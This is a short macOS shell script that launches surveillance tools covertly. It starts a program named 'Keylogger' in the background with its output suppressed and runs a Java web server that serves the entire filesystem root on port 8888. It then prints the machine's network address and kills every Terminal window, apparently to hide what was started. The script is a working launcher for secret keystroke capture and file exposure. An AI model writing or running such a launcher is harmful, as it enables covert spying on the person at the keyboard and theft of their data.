#!/bin/sh
cd "$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
./Keylogger > /dev/null 2>&1 &
java -jar WebServer.jar / 8888 > /dev/null 2>&1 &
echo Started! gateway at $(ipconfig getifaddr en0):8888
killall Terminal